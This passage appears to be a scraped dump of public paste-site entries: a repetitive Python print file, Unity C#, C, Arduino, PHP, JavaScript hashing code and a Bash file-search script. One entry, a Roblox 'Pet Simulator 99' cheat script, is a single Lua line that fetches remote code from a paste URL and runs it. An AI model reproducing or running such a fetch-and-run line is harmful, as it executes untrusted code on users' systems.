print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)

print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)
print(999999999999999*999999999999999999)


end"
8VdpM3KC,Egg exemple,JeCodeLeSoir,C#,Friday 10th of May 2024 06:13:55 AM CDT,"using System.Collections;
using UnityEngine;

public class Egg : MonoBehaviour
{
    [SerializeField] Animator animator;
    [SerializeField] Fish fish;
    
    IEnumerator Start()
    {
        yield return new WaitForSeconds(1200);

        animator.SetTrigger(""crack"");

        fish.BehaviourActive = true;
        fish.gameObject.transform.SetParent(null);

        yield return new WaitForSeconds(1);

        Destroy(this.gameObject);

        yield return 0;
    }
}
"
W1enZsdh,word frame,Divyansh_Chourey,C,Friday 10th of May 2024 06:07:39 AM CDT,"#include<stdio.h>
#include<string.h>
int main(){
    /*
    *******
    *Hello*
    *World*
    *of   *
    *c    *
    *print*
    *******
    */
    char s_arr[10][10];
    int n;
    printf(""enter the number of words: "");
    scanf(""%d"", &n);
    printf(""Enter the strings: \n"");
    for(int x=0; x<n; x++){
        scanf(""%s"", s_arr[x]);
    }
    int max_char = 1;
    for(int i=0; i<5; i++){
        if(strlen(s_arr[i])>max_char){
            max_char = strlen(s_arr[i]);
        }
    }
    for(int a=0; a<12; a++){
        printf(""*"");
    }
    printf(""\n"");

    for(int b=0; b<n; b++){
        printf(""*%-10s*\n"", s_arr[b]);
    }

    for(int a=0; a<12; a++){
        printf(""*"");
    }
    return 0;
}"
UB9eCTQb,Pet Simulator 99 Script!(powerful),Bacon_Script,Lua,Friday 10th of May 2024 06:02:37 AM CDT,"
loadstring(game:HttpGet('https://rentry.co/r2ksqhxz/raw',true))()"
YKMUVEnu,data922,TestGuy1,JSON,Friday 10th of May 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '8401f6c542cb0c94250c94fb158735d3cf6c8b14d88246ecd7511184b5c046462c5552ac64e4f3f352127b4b82cb257abe39c14e6921e1ae3860ce1d699b97c7019f9063c27f0553af48707e12679dc0eea81b89e24131f8d6831e28b84c3ef96f52dec18bd93a43dac06c57a899f1e44bb251ced07f16e6fe1eaed10a7e0d28',
  otherdata: [
    'f0e311111e52f51c6160b13099b962ff',
    '2dec976f2b255ec98198d8cfd8129fa7',
    'f76f99c195a53f7fab3c4189a71bb740',
    '60120b57ad12a5d55d9214d315f4055b',
    '0a3b0f1635a07bc799668211b93d2767',
    '1753533029ec3c26b64c863501119f80',
    'f32a23e0fa527a5de1220d2225316ce1',
    'e1a22518626d15db0f2fec9433660cb8'
  ]
}"
nSAm3c0e,mj2rm,xiRenko,JSON,Friday 10th of May 2024 05:46:31 AM CDT,"status=""on"", expired=""2025-05-10T13:06:04.758Z"""
MxJeKqhR,util-ref,benjaminvr,JavaScript,Friday 10th of May 2024 05:07:03 AM CDT,"// https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest#converting_a_digest_to_a_hex_string

/*
	Open a new browser tab or window and paste the following in your developer console (CTRL + SHIFT + I)
    
    (You may need to type ""allow pasting"", as indicated by your browser)
*/

const text =
  ""An obscure body in the S-K System, your majesty. The inhabitants refer to it as the planet Earth."";

async function digestMessage(message) {
  const msgUint8 = new TextEncoder().encode(message); // encode as (utf-8) Uint8Array
  const hashBuffer = await crypto.subtle.digest(""SHA-256"", msgUint8); // hash the message
  const hashArray = Array.from(new Uint8Array(hashBuffer)); // convert buffer to byte array
  const hashHex = hashArray
    .map((b) => b.toString(16).padStart(2, ""0""))
    .join(""""); // convert bytes to hex string
  return hashHex;
}

/*
	Get the sha256 hash for any string, in this case the string assigned to the text variable
*/

const result = await digestMessage(text);

/*
	The result is ""6efd383745a964768989b9df420811abc6e5873f874fc22a76fe9258e020c2e1"" 
    
    Repeat this with any other string
*/
"
dKEASgZ5,T-relay S3-Test Relay,hwthinker,Arduino,Friday 10th of May 2024 05:06:08 AM CDT,"// Define the pin connections
#define DATA_PIN  7
#define CLOCK_PIN 5
#define LATCH_PIN 6
// #define ENABLE_PIN 4

// Define the relay output pins on the 74HC595
#define RELAY1_PIN 0
#define RELAY2_PIN 1
#define RELAY3_PIN 2
#define RELAY4_PIN 3
#define RELAY5_PIN 4
#define RELAY6_PIN 5

void setup() {
  // Initialize the pins as outputs
  pinMode(DATA_PIN, OUTPUT);
  pinMode(CLOCK_PIN, OUTPUT);
  pinMode(LATCH_PIN, OUTPUT);
  // pinMode(ENABLE_PIN, OUTPUT);
}

void loop() {
  // Example usage: toggle each relay every 1 second
  for (int i = 0; i < 6; i++) {
    setRelay(i, true);  // Turn on the relay
    delay(1000);
    setRelay(i, false);  // Turn off the relay
    delay(1000);
  }
}

// Function to set a single relay on or off
void setRelay(int relayNumber, bool state) {
  // Calculate the bit position of the relay
  int bitPosition = 1 << relayNumber;

  // Set the data pin high or low depending on the state
  digitalWrite(DATA_PIN, state ? HIGH : LOW);

  // Shift out the data
  shiftOut(DATA_PIN, CLOCK_PIN, MSBFIRST, bitPosition);

  // Latch the data
  digitalWrite(LATCH_PIN, HIGH);
  digitalWrite(LATCH_PIN, LOW);

  // Enable the output
  // digitalWrite(ENABLE_PIN, LOW);
}"
KQCvvbUY,php untuk terima post,kura2yamato,PHP,Friday 10th of May 2024 05:01:11 AM CDT,"<?php 
define('_start_time', microtime(true));
logWrite(""Start"");
$param=[
	'post'=>$_POST??[],
	'created'=>microtime(true)
];

logWrite(""response"");
responseText($param); exit; //setelah memakai ini harus exit ato die

//+++++++++++++++HARUS DIPERHATIKAN++++++++++++++
//pengganti echo/print yang cetak ke halaman... semua harus taro log dan baca di log
function logWrite($txt){
	$t = microtime(true) - _start_time;
	$now = date(""Y/m/d H:i.s"");
	if(!defined('_IDLOG')) define('_IDLOG', ceil( microtime(true) * 100) );
	$str = sprintf(""%s %5.2f| %s[%s]"", $now, $t, $txt, _IDLOG);
	$file = date(""YmdH"")."".log"";
	$folder = __DIR__.""/logs"";
	if(!is_dir($folder)){
		mkdir($folder);
		logWrite($txt);
	}
	error_log( trim($str??'').""\n"", 3, $folder.""/"".$file );
}

function responseText($data=NULL, $error_code=0, $message=""success""){
	$res=[
		'error'=>$error_code, //bila 1 berarti error
		'message'=>$message,
	
	];
	if(isset($data) && !is_null($data) ){
		$res['data']= $data;
	}
	
	echo json_encode($res);
	return;
}"
CgM5m0w5,wcfm-store-page-article-tab-wolmart-theme,palsushobhan,PHP,Friday 10th of May 2024 04:55:29 AM CDT,"add_action( 'wcfmmp_before_store_article', function() {
    do_action( 'wolmart_print_before_page_layout' );
    echo '<div class=""post-archive"">';
} );

add_action('wcfmmp_before_store_article_loop', function() {
    global $wolmart_layout, $wp_query;

    $posts_filter = $wolmart_layout['posts_filter'];
    $wrap_classes = array( 'posts' );
    $wrap_attrs   = '';

    if ( isset( $_REQUEST['post_type'] ) && in_array( $_REQUEST['post_type'], array( 'list', 'mask', 'simple' ) ) ) {
        $wolmart_layout['post_type'] = $_REQUEST['post_type'];
    } elseif ( wolmart_doing_ajax() && ! empty( $_REQUEST['only_posts'] ) ) {
        $wolmart_layout['post_type'] = '';
    }
    if(empty($wolmart_layout['post_type'])) {
        $wolmart_layout['post_type'] = 'list';
    }
    $post_type = $wolmart_layout['post_type'];

    // Category Filter
    if ( $posts_filter &&
        ( empty( $wolmart_layout['left_sidebar'] ) || 'hide' == $wolmart_layout['left_sidebar'] ) &&
        ( empty( $wolmart_layout['right_sidebar'] ) || 'hide' == $wolmart_layout['right_sidebar'] ) &&
        'list' != $post_type ) {
        wolmart_get_template_part( 'posts/elements/blog-filter' );
    }

    // Grid or Masonry
    if ( 'masonry' == $wolmart_layout['posts_layout'] ) {
        $wrap_classes[] = 'grid';
        $wrap_classes[] = 'masonry';
        $wrap_attrs     = "" data-grid-options='"" . json_encode( array( 'masonry' => array( 'horizontalOrder' => true ) ) ) . ""'"";
        wp_enqueue_script( 'isotope-pkgd' );
    }

    // List or Grid
    if ( 'list' == $post_type ) {
        $wrap_classes[] = 'list-type-posts';
        $wrap_classes[] = wolmart_get_col_class(
            array(
                'md'  => 1,
                'sm'  => 1,
                'min' => 1,
            )
        );
    } else {
        $cols_cnt        = wolmart_get_responsive_cols( array( 'lg' => intval( $wolmart_layout['posts_column'] ) ) );
        $cols_cnt['min'] = 1;
        $wrap_classes[]  = wolmart_get_col_class( $cols_cnt );
    }

    // Loadmore Button or Pagination
    if ( 1 < $wp_query->max_num_pages ) {
        if ( 'scroll' == $wolmart_layout['loadmore_type'] ) {
            $wrap_classes[] = 'load-scroll';
        }
        $wrap_attrs .= ' ' . wolmart_loadmore_attributes( '', array( 'blog' => true ), 'page', $wp_query->max_num_pages );
    }

    // Print Posts
    $wrap_classes = apply_filters( 'wolmart_post_loop_wrapper_classes', $wrap_classes );

    echo '<div class=""' . esc_attr( implode( ' ', $wrap_classes ) ) . '""' . $wrap_attrs . ( $post_type ? ' data-post-type=""' . $post_type . '""' : '' ) . '>';

});

add_action( 'wcfmmp_store_article_template', function() {
    wolmart_get_template_part( 'posts/post', null, array( 'single' => false ) );
});

add_action( 'wcfmmp_after_store_article_loop', function( $store_id, $store_info ) {
    echo '</div>';
}, 50, 2);

add_action( 'wcfmmp_store_article_template_none', function() {
?>
    <h2 class=""entry-title""><?php esc_html_e( 'Nothing Found', 'wolmart' ); ?></h2>
<?php
});

add_action( 'wcfmmp_after_store_article', function() {
    do_action( 'wolmart_print_after_page_layout' );
    echo '</div>';
} );

add_filter( 'wcfm_is_allow_store_articles', '__return_true' );
"
84vhYa9a,superfind,subbass,Bash,Friday 10th of May 2024 04:53:01 AM CDT,"#!/bin/bash
#
# Script Name: superfind V7
# Author: Subbass
# Date: May 10, 2024
#
# Description:
#   A versatile file search tool that allows users to search for files based on patterns
#   within user-defined paths stored in a configuration file or a specified directory. 
#   Supports creating playlists from the search results, editing the path configuration file,
#   and displays results with coloured output.
#
# Features:
#   - Search within specified paths using flags or a direct folder path
#   - Option to create a playlist of search results
#   - Coloured output for better readability
#   - Ability to open and edit the path configuration file
#
# Usage:
#   - Search for files using a flag:    ./superfind <flag> ""search_pattern""
#   - Search in a specified directory:  ./superfind -d <directory> ""search_pattern""
#   - Create a playlist of the results: ./superfind -p <flag> ""search_pattern""
#   - Edit the path configuration file: ./superfind --edit
#   - Show help message:                ./superfind -h
#
# Examples:
#   - superfind -m ""old movie""      - Search for videos in movies directory.
#   - superfind -d /tmp ""test file"" - Search in a specified directory.
#   - superfind -p -m ""funny clip""  - Create a playlist from search results.
#   - superfind --edit              - Open the path configuration file in an editor.
# Configuration File: superfind_paths.conf
#

# Extended Color Definitions
col1=""\033[0;31m""  # Red
col2=""\033[0;32m""  # Green
col3=""\033[0;33m""  # Yellow
col4=""\033[0;34m""  # Blue
col5=""\033[0;35m""  # Magenta
col6=""\033[0;36m""  # Cyan
col7=""\033[0;37m""  # Light Gray
col8=""\033[1;30m""  # Dark Gray
col9=""\033[1;31m""  # Light Red
col10=""\033[1;32m"" # Light Green
col11=""\033[1;33m"" # Light Yellow
col12=""\033[1;34m"" # Light Blue
col13=""\033[1;35m"" # Light Magenta
col14=""\033[1;36m"" # Light Cyan
col15=""\033[1;37m"" # White

# Text Style Definitions
style_bold=""\033[1m""
style_underline=""\033[4m""
style_blink=""\033[5m""
style_reset=""\033[0m""  # Reset color and style

# Colour Usage in Output
searchin_color=""$col6""  # Use Cyan for ""[ Searching in ]""
file_color=""$col2""      # Use Green for files
folder_color=""$col4""    # Use Blue for folders
no_match=""$col9""        # Use Magenta for no matches
reset_color=""$style_reset""  # Reset colour and style

# Determine the directory in which the script resides
SCRIPT_DIR=$(dirname ""$(readlink -f ""$0"")"")

# Configuration
PATHS_FILE=""$SCRIPT_DIR/superfind_paths.conf""
EDITOR=""${EDITOR:-nano}""

# Ensure the configuration file exists
if [ ! -f ""$PATHS_FILE"" ]; then
    # Default playlist directory using the user's home directory
    default_playlist_dir=""/home/$USER/Playlists""

    cat > ""$PATHS_FILE"" << EOF
# Default Playlist Directory
playlist_dir=$default_playlist_dir

# Example Paths Configuration
# Use these examples as a guide to add your own:
# -m /home/user/movies/
# -mu /home/user/Music
# --movies /home/user/movies/
# -tvgroup /path/to/tv1;/path/to/tv2;/path/to/tv3
#
EOF
fi

# Help function to include examples with wildcards
show_help() {
    echo ""Usage: superfind [options] <search_pattern>""
    echo ""Options:""
    echo ""  -p, --playlist     Create a playlist of the results.""
    echo ""  -d, --dir <dir>    Specify a directory for a one-time search.""
    echo ""  -h, --help         Show this help message.""
    echo ""  -e, --edit         Open the paths file in a text editor.""
    echo ""  --copy             Copy matching files to the current directory.""
    echo ""  --move             Move matching files to the current directory.""
    echo ""  -o, --open         Open the created playlist.""
    echo ""  <flag>             Search in the paths associated with this flag (e.g., -tvgroup for TV shows).""
    echo ""Examples:""
    echo ""  superfind --move -tvgroup '*episode*'  Search and move all files with 'episode' in their name under tvgroup paths.""
    echo "" ""
    echo ""User defind path flags:""
    grep '^-' ""$PATHS_FILE"" | sed 's/^/  /'
}

open_editor() {
    $EDITOR ""$PATHS_FILE""
}

#echo ""Debug: Starting search_files function.""
# Search function updated to accommodate wildcard patterns
search_files() {
    local search_pattern=$1
    local pattern=$2
    local search_flag=$3
    local file_count=0
    local folder_count=0
    local cwd=$(pwd)

    local playlist_dir=$(grep 'playlist_dir=' ""$PATHS_FILE"" | cut -d'=' -f2)
    if [[ -n ""$playlist_dir"" ]]; then
        mkdir -p ""$playlist_dir""
    else
        echo ""Error: Playlist directory not defined or invalid in configuration.""
        return 1
    fi

    local safe_search_term=$(echo ""$pattern"" | sed 's/[^a-zA-Z0-9]/_/g')
    if [[ ""$create_playlist"" == true ]]; then
        local playlist_file=""${playlist_dir}/${search_flag}-${safe_search_term}-$(date +%Y%m%d%H%M%S).m3u""
        > ""$playlist_file""
    fi

    IFS=';' read -ra paths <<< ""$search_pattern""
    for search_path in ""${paths[@]}""; do
        echo -e "" [ Searching in ] ${searchin_color}$search_path${reset_color}""

        # Using find and grep to match complex patterns across paths
        local file_results=$(find ""$search_path"" -type f -print | grep -i ""$(echo ""$pattern"" | sed 's/\*/.*/g')"")
        if [[ -z ""$file_results"" ]]; then
            echo ""   No files found matching pattern '$pattern' in $search_path.""
        else
            if [[ ""$create_playlist"" == true ]]; then
                while IFS= read -r line; do
                    local ext=""${line##*.}""
                    if [[ ! "" ${exclude_list[@]} "" =~ "" $ext "" ]]; then
                        echo ""$line"" >> ""$playlist_file""
                        let file_count++
                    fi
                done <<< ""$file_results""
                # Sort the playlist after all files are added
                sort ""$playlist_file"" -o ""$playlist_file""
            else
                while IFS= read -r line; do
                    echo -e ""   ${line%/*}/${file_color}${line##*/}${reset_color}""
                    let file_count++
                    if [[ ""$move_files"" == true ]]; then
                        local source_path=$(dirname ""$line"")
                        local target_file=""$(basename ""$line"")""
                        if [[ ""$source_path"" == ""$cwd"" ]]; then
                            echo ""   File $line is already in the current directory, skipping move.""
                        elif [[ -f ""$target_file"" ]]; then
                            echo ""   Skipping move for $line: File already exists in target directory.""
                        else
                            mv ""$line"" ./
                            echo ""   Moved $line to the current directory.""
                        fi
                    fi

                    if [[ ""$copy_files"" == true ]]; then
                        local source_path=$(dirname ""$line"")
                        local target_file=""$(basename ""$line"")""
                        if [[ ""$source_path"" == ""$cwd"" ]]; then
                            echo ""   File $line is already in the current directory, skipping copy.""
                        elif [[ -f ""$target_file"" ]]; then
                            echo ""   Skipping copy for $line: File already exists in target directory.""
                        else
                            cp ""$line"" ./
                            echo ""   Moved $line to the current directory.""
                        fi
                    fi
                done <<< ""$file_results""
            fi
            echo ""   ------------------------------------------""
        fi

        local folder_results=$(find ""$search_path"" -type d -iname ""*$pattern*"" | grep -i ""$(echo ""$pattern"" | sed 's/\*/.*/g')"")
        if [[ -z ""$folder_results"" ]]; then
            echo ""   No folders found matching pattern '$pattern' in $search_path.""
        else
            while IFS= read -r folder; do
                local num_files_in_folder=$(find ""$folder"" -type f -iname ""*$pattern*"" | wc -l)
                echo -e ""   ${folder_color}$folder${reset_color} ($num_files_in_folder files)""
                let folder_count++
            done <<< ""$folder_results""
        fi
        echo ""   ------------------------------------------""
    done

    if [[ ""$create_playlist"" == true ]]; then
        echo ""Playlist created: $playlist_file""
    fi
    echo ""Results: ${file_count} files : ${folder_count} folders""

# Open the playlist if the open flag is set
if [[ ""$open_playlist"" == true ]]; then
xdg-open ""$playlist_file"" &> /dev/null &
    echo ""Opening playlist...""
fi
}

#echo ""Debug: Exiting search_files function.""

# Manual parsing of options
create_playlist=false
dir_path=""""
pattern=""""
flag=""""
open_playlist=false
move_files=false  # Initialize the flag

# Updated command-line options parsing
while [[ $# -gt 0 ]]; do
    case ""$1"" in
        -p|--playlist)
            create_playlist=true
            shift
            ;;
        -d|--dir)
            dir_path=""$2""
            shift 2
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        -e|--edit)
            open_editor
            exit 0
            ;;
        --copy)
            copy_files=true
            shift
            ;;
        --move)
            move_files=true
            shift
            ;;
        -o|--open)
            open_playlist=true
            shift
            ;;
        -po)
            create_playlist=true
            open_playlist=true
            shift
            ;;
        -*)
            flag=""$1""
            pattern=""$2""
            shift 2
            ;;
        *)
            pattern=""$1""
            shift
            ;;
    esac
done

# Validate that a pattern is provided
if [[ -z ""$pattern"" ]]; then
    echo ""Error: No search pattern provided.""
    show_help
    exit 1
fi

# Determine the search path based on flag or direct directory option
if [[ -n ""$dir_path"" ]]; then
    search_files ""$dir_path"" ""$pattern""
elif [[ -n ""$flag"" ]]; then
    while IFS= read -r line; do
        key=$(echo ""$line"" | cut -d' ' -f1)
        path=$(echo ""$line"" | cut -d' ' -f2-)
        if [[ ""$flag"" == ""$key"" ]]; then
            search_files ""$path"" ""$pattern""
            exit 0
        fi
    done < ""$PATHS_FILE""
    echo ""Error: Flag $flag not found in $PATHS_FILE.""
    exit 1
else
    echo ""Error: No valid directory or flag specified.""
    exit 1
fi

if [[ ""$create_playlist"" == true ]]; then
    search_files ""$search_path"" ""$pattern"" > ""$(date +%Y%m%d%H%M%S)_playlist.m3u""
fi

"
